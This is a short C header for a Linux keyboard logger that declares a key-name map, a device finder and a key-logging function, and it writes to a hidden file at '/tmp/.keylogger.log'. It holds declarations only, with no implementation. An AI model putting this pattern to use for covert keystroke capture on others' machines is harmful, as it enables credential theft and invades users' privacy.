#ifndef KEYBOARD_LOGGER_H
#define KEYBOARD_LOGGER_H

#include <linux/input.h>
#include <stdbool.h>
#include <stdio.h>

#include "behavior_subject.h"

#define BUFFER_SIZE 64
#define LOG_FILE "/tmp/.keylogger.log"

typedef struct {
    const char *normal;
    const char *shifted;
} KeyMap;

extern const KeyMap key_map[];
extern const int KEY_MAP_SIZE;

const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active);
char *find_keyboard_device(const char *target_device_name);
void log_key(FILE *fp, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pressed, bool alt_pressed,
             const char *key_name);

#endif  // KEYBOARD_LOGGER_H
